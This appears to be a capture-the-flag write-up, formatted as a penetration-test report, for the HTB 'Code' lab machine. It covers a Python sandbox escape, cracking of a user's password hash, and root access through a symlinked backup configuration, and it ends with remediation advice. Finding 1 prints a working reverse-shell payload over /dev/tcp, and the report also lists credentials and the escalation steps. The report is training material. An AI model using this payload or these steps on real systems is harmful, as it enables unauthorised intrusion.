@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penetration Testing Report - Code</title>
+    <style>
+        /* --- Universal Styles for Screen and Print --- */
+        body {
+            background-color: #0a4b63; /* Dark Teal Background */
+            color: #f0f0f0; /* Off-white text for readability */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        .container {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 20px 40px;
+            background-color: #0c5975;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.5);
+        }
+        h1, h2, h3, h4 {
+            color: #ffffff;
+            border-bottom: 1px solid #2a9d8f;
+            padding-bottom: 10px;
+        }
+        h1 {
+            text-align: center;
+            font-size: 2.5em;
+            padding: 20px 0;
+            border-top: 3px solid #93c47d; /* Green accent line */
+            border-bottom: 3px solid #93c47d; /* Green accent line */
+            margin-bottom: 5px;
+        }
+        h2.subtitle {
+             text-align: center;
+             font-size: 1.8em;
+             border: none;
+             margin-top: 0;
+             margin-bottom: 5px;
+        }
+        h3.report-meta {
+            text-align: center;
+            font-size: 1.2em;
+            border: none;
+            margin-top: 0;
+            margin-bottom: 5px;
+        }
+        hr {
+            border: 0;
+            height: 1px;
+            background-color: #2a9d8f;
+            margin: 30px 0;
+        }
+        .confidential {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .confidential strong {
+            font-size: 1.1em;
+        }
+        .confidential em {
+            font-size: 0.9em;
+            color: #cccccc;
+        }
+        a {
+            color: #93c47d; /* Green accent for links */
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        ul, ol {
+            padding-left: 20px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border: 1px solid #1a7469;
+        }
+        thead {
+            background-color: #93c47d; /* Green accent for table headers */
+            color: #0a4b63;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        thead th {
+             font-weight: bold;
+        }
+        tbody tr:nth-child(even) {
+            background-color: #0a4b63; /* Striped rows */
+        }
+        pre {
+            background-color: #002b36; /* Darker background for code */
+            color: #cddc39; /* Lime green text for code */
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            border: 1px solid #1a7469;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+        .footer {
+             text-align: center;
+             margin-top: 40px;
+             font-style: italic;
+             color: #cccccc;
+        }
+        
+        /* This rule helps control the margins set by the browser's print function */
+        @page {
+            margin: 0.75in;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <h1>CAPTURE THE FLAG PENETRATION TESTING</h1>
+        <h2 class="subtitle">Report of Findings: Code</h2>
+        <h3 class="report-meta">Date: March 24, 2025</h3>
+        <h3 class="report-meta">Version: 1.0</h3>
+
+        <div class="confidential">
+            <strong>CONFIDENTIAL</strong><br>
+            <em>For educational and training purposes only</em>
+        </div>
+
+        <hr>
+        
+        <h2 id="table-of-contents">TABLE OF CONTENTS</h2>
+        <ol>
+            <li><a href="#executive-summary">Executive Summary</a></li>
+            <li><a href="#technical-summary">Technical Summary</a></li>
+            <li><a href="#detailed-findings">Detailed Technical Findings</a></li>
+            <li><a href="#attack-timeline">Attack Timeline</a></li>
+            <li><a href="#port-scan">Port Scan Results</a></li>
+            <li><a href="#remediation">Remediation Recommendations</a></li>
+            <li><a href="#evidence">Evidence Files</a></li>
+            <li><a href="#conclusion">Conclusion</a></li>
+        </ol>
+
+        <hr>
+
+        <h2 id="executive-summary">EXECUTIVE SUMMARY</h2>
+        <p>This report details the findings of a penetration test conducted against the HTB Code machine (10.10.11.62) on March 24, 2025. The assessment revealed a chain of critical vulnerabilities, beginning with a Python sandbox escape on a public web service, followed by lateral movement through credential cracking, and culminating in full system compromise via a misconfigured local backup utility. This sequence allowed an unauthenticated attacker to escalate privileges from no access to complete root control.</p>
+        
+        <h3>Key Findings Summary</h3>
+        <ul>
+            <li><strong>3 critical vulnerabilities</strong> identified and exploited.</li>
+            <li><strong>Complete system compromise</strong> achieved (user and root).</li>
+            <li><strong>Remote Code Execution</strong> via Python sandbox escape in a web-based code editor.</li>
+            <li><strong>Credential Exposure</strong> from weakly hashed passwords in a local database, enabling lateral movement.</li>
+            <li><strong>Privilege Escalation</strong> by abusing a misconfigured backup script through symbolic link manipulation.</li>
+        </ul>
+
+        <h3>Risk Level: CRITICAL</h3>
+        <p>The system is exposed to a high-impact, low-complexity attack path that allows an external attacker to gain full administrative control. The public-facing web service provides a direct entry point, and internal misconfigurations allow for straightforward privilege escalation.</p>
+
+        <hr>
+
+        <h2 id="technical-summary">TECHNICAL SUMMARY</h2>
+        
+        <h3>Target Information</h3>
+        <ul>
+            <li><strong>Target IP:</strong> 10.10.11.62</li>
+            <li><strong>Attacker IP:</strong> 10.10.14.12</li>
+            <li><strong>Operating System:</strong> Ubuntu 20.04.6 LTS</li>
+            <li><strong>Hostname:</strong> code</li>
+        </ul>
+
+        <h3>Attack Vector Summary</h3>
+        <ol>
+            <li><strong>Initial Access:</strong> A Python sandbox escape vulnerability in the web application on port 5000 was exploited. By enumerating Python's subclasses, `subprocess.Popen` was invoked to execute a reverse shell command.</li>
+            <li><strong>Lateral Movement:</strong> A local SQLite database was found containing user password hashes. The hash for the user 'martin' was cracked, and the resulting credentials were used to access the system via SSH.</li>
+            <li><strong>Privilege Escalation:</strong> A local backup utility was manipulated. By creating a symbolic link to the root directory and modifying the backup's configuration file, the utility was tricked into archiving the `/root` directory, exposing its contents.</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="detailed-findings">DETAILED TECHNICAL FINDINGS</h2>
+
+        <h3>Finding 1: Python Sandbox Escape leading to Remote Code Execution</h3>
+        <p><strong>Severity:</strong> CRITICAL<br>
+        <strong>CVSS Score:</strong> 9.8<br>
+        <strong>CWE:</strong> CWE-94 (Improper Control of Generation of Code - 'Code Injection')</p>
+        <p><strong>Description:</strong><br>
+        The "Python Code Editor" web application on port 5000 allows for the execution of user-supplied Python code. The environment lacks sufficient sandboxing, making it possible to access dangerous built-in modules. An attacker can enumerate all loaded classes in memory to find and instantiate the `subprocess.Popen` class, which can be used to execute arbitrary operating system commands.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Endpoint:</strong> Web service on `http://10.10.11.62:5000/`</li>
+            <li><strong>Exploitation Method:</strong> Enumerating `().__class__.__bases__[0].__subclasses__()` to locate the `subprocess.Popen` class (index 317) and using it to spawn a shell.</li>
+        </ul>
+        <p><strong>Evidence:</strong><br>The following payload was executed in the web editor to gain a reverse shell:</p>
+        <pre><code>().__class__.__bases__[0].__subclasses__()[317](["/bin/bash", "-c", "sh -i &gt;& /dev/tcp/10.10.14.13/4444 0&gt;&1"], stdin=-1, stdout=-1, stderr=-1)</code></pre>
+        <p><strong>Impact:</strong> This vulnerability provides an unauthenticated attacker with initial access to the system as the `app-production` user, serving as the entry point for further attacks.</p>
+
+        <h3>Finding 2: Insufficiently Protected Credentials</h3>
+        <p><strong>Severity:</strong> HIGH<br>
+        <strong>CVSS Score:</strong> 7.5<br>
+        <strong>CWE:</strong> CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)</p>
+        <p><strong>Description:</strong><br>
+        After gaining initial access, a SQLite database file (`instance/database.db`) was discovered. This database stored user credentials with passwords hashed using a weak, unsalted algorithm susceptible to offline cracking. The hash for the user `martin` was successfully cracked.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Credential Discovery Method:</strong> Querying the `user` table in `/home/app-production/app/instance/database.db`.</li>
+            <li><strong>Hashing Algorithm:</strong> Weak (assumed to be unsalted SHA1 or similar).</li>
+            <li><strong>Credentials Found:</strong> martin:3de6f30c4a09c27fc71932bfc68474be</li>
+            <li><strong>Cracked Password:</strong> nafeelswordsmaster</li>
+        </ul>
+        <p><strong>Impact:</strong> The exposure of weak hashes allowed for lateral movement from the low-privileged `app-production` user to the `martin` user, granting increased access and a stable foothold via SSH.</p>
+
+        <h3>Finding 3: Privilege Escalation via Backup Utility Misconfiguration</h3>
+        <p><strong>Severity:</strong> HIGH<br>
+        <strong>CVSS Score:</strong> 7.8<br>
+        <strong>CWE:</strong> CWE-59 (Improper Link Resolution Before File Access - 'Link Following')</p>
+        <p><strong>Description:</strong><br>
+        The user `martin` has access to a backup utility configured via a `task.json` file. The utility appears to run with elevated privileges (likely as root) and does not properly validate the paths it is configured to archive, nor does it prevent the following of symbolic links. An attacker can abuse this by creating a symbolic link to the system's root directory (`/`) and then modifying `task.json` to instruct the utility to archive the `/root` directory via this symlink.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Component:</strong> Automated backup script or cron job.</li>
+            <li><strong>Configuration File:</strong> `~/backups/task.json`</li>
+            <li><strong>Exploitation Method:</strong>
+                1. Create a symlink: `ln -s / ho`
+                2. Modify `task.json` to include `"/home/martin/backups/ho/root"` in the `directories_to_archive` list.
+            </li>
+        </ul>
+        <p><strong>Evidence:</strong><br>After modifying the configuration, the backup utility created an archive named `code_home_martin_backups_ho_root_2025_March.tar.bz2`, which contained the contents of the `/root` directory.</p>
+        <p><strong>Impact:</strong> This vulnerability allows a standard user to read files from any location on the filesystem, including the home directory of the root user, leading to a full system compromise by revealing the root flag.</p>
+
+        <hr>
+
+        <h2 id="attack-timeline">ATTACK TIMELINE</h2>
+        
+        <h3>Phase 1: Reconnaissance</h3>
+        <ul>
+            <li><strong>Network Scan:</strong> Identified open ports 22 (SSH) and 5000 (HTTP).</li>
+            <li><strong>Service Analysis:</strong> Discovered a "Python Code Editor" on port 5000 served by Gunicorn 20.0.4.</li>
+        </ul>
+
+        <h3>Phase 2: Initial Access</h3>
+        <ul>
+            <li><strong>Vulnerability Discovery:</strong> Identified a Python sandbox escape vector.</li>
+            <li><strong>Exploitation:</strong> Executed a crafted payload to call `subprocess.Popen` and establish a reverse shell.</li>
+            <li><strong>Foothold Gained:</strong> Received a shell as the `app-production` user and upgraded it to a fully interactive TTY.</li>
+        </ul>
+        
+        <h3>Phase 3: Lateral Movement</h3>
+        <ul>
+            <li><strong>Internal Enumeration:</strong> Located the `instance/database.db` file.</li>
+            <li><strong>Credential Extraction:</strong> Queried the database to extract user password hashes.</li>
+            <li><strong>Offline Cracking:</strong> Cracked the hash for user `martin`.</li>
+            <li><strong>SSH Access:</strong> Successfully authenticated as `martin` via SSH.</li>
+        </ul>
+
+        <h3>Phase 4: Privilege Escalation</h3>
+        <ul>
+            <li><strong>Local Reconnaissance:</strong> Discovered the `backups` directory and `task.json` configuration file.</li>
+            <li><strong>Exploit Preparation:</strong> Created a symbolic link to the root filesystem.</li>
+            <li><strong>Configuration Abuse:</strong> Modified `task.json` to point to the `/root` directory via the symlink.</li>
+            <li><strong>Root Access:</strong> Waited for the backup to run, then extracted the root flag from the resulting archive.</li>
+        </ul>
+
+        <hr>
+        
+        <h2 id="port-scan">PORT SCAN RESULTS</h2>
+        <h3>TCP Port Scan</h3>
+        <pre><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+5000/tcp open  http    Gunicorn 20.0.4
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+        <hr>
+        
+        <h2 id="remediation">REMEDIATION RECOMMENDATIONS</h2>
+        
+        <h3>CRITICAL PRIORITY</h3>
+        <ol>
+            <li><strong>Implement a Secure Sandbox:</strong> The Python execution environment must be properly sandboxed. Disable or restrict access to dangerous modules like `os`, `subprocess`, `sys`, etc. Utilize hardened libraries designed for safe code evaluation.</li>
+            <li><strong>Strengthen Password Security:</strong> Enforce the use of a strong, modern, and salted password hashing algorithm (e.g., Argon2, bcrypt) for all stored user credentials. Immediately invalidate all existing passwords.</li>
+            <li><strong>Harden Backup Scripts:</strong> Configure the backup utility to run with the lowest possible privileges. Critically, the script must be modified to prevent it from following symbolic links (e.g., using the appropriate flags in tools like `tar`). Implement strict path validation on the `task.json` file.</li>
+        </ol>
+
+        <h3>HIGH PRIORITY</h3>
+        <ol>
+            <li><strong>Principle of Least Privilege:</strong> The `app-production` user should have minimal permissions and should not have read access to application databases or other sensitive configuration files.</li>
+            <li><strong>Security Audits for Internal Applications:</strong> Regularly review and audit internal scripts and applications for security flaws, especially those that run with elevated privileges.</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="evidence">EVIDENCE FILES</h2>
+        
+        <h3>User Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /home/app-production/user.txt</li>
+            <li><strong>Value:</strong> 8b8de4373c1faa826cfd519fd676c7e8</li>
+        </ul>
+
+        <h3>Root Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /root/root.txt</li>
+            <li><strong>Value:</strong> ff9a336d085dd4520a83e8d055ecddd1</li>
+        </ul>
+
+        <h3>Key Artifacts</h3>
+        <ul>
+            <li><strong>RCE Payload:</strong> `().__class__.__bases__[0].__subclasses__()[317](...)`</li>
+            <li><strong>Compromised Hash:</strong> martin:3de6f30c4a09c27fc71932bfc68474be</li>
+            <li><strong>Privilege Escalation Vector:</strong> Manipulation of `task.json` combined with a symbolic link.</li>
+        </ul>
+
+        <hr>
+
+        <h2 id="conclusion">CONCLUSION</h2>
+        <p>The security posture of the HTB Code machine is critically flawed. The chain of vulnerabilities, starting from a public-facing RCE and moving through weak internal security controls, demonstrates a defense-in-depth failure. The initial sandbox escape vulnerability is a high-impact flaw that provides an immediate entry point. The subsequent discovery of weakly hashed passwords and a misconfigured, privileged backup utility made escalating to full system control a straightforward process.</p>
+        
+        <p><strong>Business Risk:</strong> CRITICAL - The system is vulnerable to a complete takeover by an unauthenticated external attacker, which could lead to data theft, service disruption, and the machine being used as a pivot point for further attacks into the network.</p>
+        <p><strong>Technical Risk:</strong> A series of high-severity vulnerabilities in the web application, user credential management, and system administration scripts create a clear and repeatable path to root compromise.</p>
+        
+        <hr>
+
+        <div class="footer">
+            <p><strong>Report prepared by:</strong> Security Assessment Team<br>
+            <strong>Date:</strong> March 24, 2025</p>
+            <p>CONFIDENTIAL - For educational purposes only</p>
+        </div>
+
+    </div>
+
+</body>
+</html>
